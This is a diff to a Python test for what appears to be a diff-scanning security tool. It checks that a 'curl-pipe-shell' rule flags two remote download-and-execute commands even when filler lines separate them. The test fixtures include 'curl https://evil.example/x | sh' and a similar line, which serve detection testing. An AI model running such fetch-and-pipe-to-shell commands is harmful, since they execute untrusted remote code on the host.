@@ -1029,10 +1029,11 @@ def test_a_text_whose_only_diff_marker_is_glued_to_a_cr_is_still_shell_scanned_w
 
 def test_the_second_reading_of_scan_diff_runs_even_when_the_first_found_something_and_fails_closed(monkeypatch):
     from diff_sentry.indicators import scan_diff
-    text = "curl https://other.example/y | sh\ncurl https://evil.example/x\r| sh\n"
+    text = "curl https://other.example/y | sh\n" + "echo filler\n" * 40 + "curl https://evil.example/x\r| sh\n"
     urls = {h.evidence for h in scan_diff(text) if h.rule == "curl-pipe-shell"}
     assert any("other.example" in e for e in urls) and any("evil.example" in e for e in urls), urls          # the first reading has the first command, the second the other
-    patch = "diff --git a/x b/x\n+curl https://other.example/y | sh\n+curl https://evil.example/x\r| sh\n"        # the same with a header: the segmented path
+    filler = "+echo filler\n" * 40                                                                     # far enough apart that no one window holds both commands
+    patch = "diff --git a/x b/x\n+curl https://other.example/y | sh\n" + filler + "+curl https://evil.example/x\r| sh\n"        # the same with a header: the segmented path
     urls = {h.evidence for h in scan_diff(patch) if h.rule == "curl-pipe-shell"}
     assert any("other.example" in e for e in urls) and any("evil.example" in e for e in urls), urls
     def boom(*a, **k):
